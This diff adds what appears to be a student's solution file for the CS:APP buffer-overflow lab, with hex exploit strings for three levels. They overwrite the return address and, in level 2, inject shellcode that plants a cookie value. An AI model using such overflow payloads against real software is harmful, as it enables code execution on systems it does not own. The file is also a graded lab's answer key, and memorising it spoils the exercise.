@@ -1,0 +1,46 @@
+level 0
+31 31 31 31 
+31 31 31 31 
+31 31 31 31 
+31 31 31 31 
+31 31 31 31 
+31 31 31 31 
+31 31 31 31 
+31 31 31 31  /* strings to the buf  */
+31 31 31 31 /* stings change the pushed %ebp */
+83 8d 04 08 /* return address to smoke function */
+
+level 1
+31 31 31 31 
+31 31 31 31 
+31 31 31 31 
+31 31 31 31 
+31 31 31 31 
+31 31 31 31 
+31 31 31 31 
+31 31 31 31  /* strings to the buf  */
+31 31 31 31 /* stings change the pushed %ebp */
+38 8d 04 08 /* return address to smoke function */
+31 31 31 31 
+b8 1f f2 65 /*cookie*/
+
+level 2
+b8 ec c1 04 
+08 bb b8 1f 
+f2 65 89 18
+68 eb 8c 04
+08 c3 31 31 
+31 31 31 31 
+31 31 31 31 
+31 31 31 31  /* strings to the buf  */
+31 31 31 31 /* stings change the pushed %ebp */
+00 3b 68 55 /* return address to smoke function */
+
+mov $0x804c1ec,%eax
+mov $0x65f21fb8,%ebx
+mov %ebx,(%eax)
+push $0x08048ceb
+ret
+
+ 
+
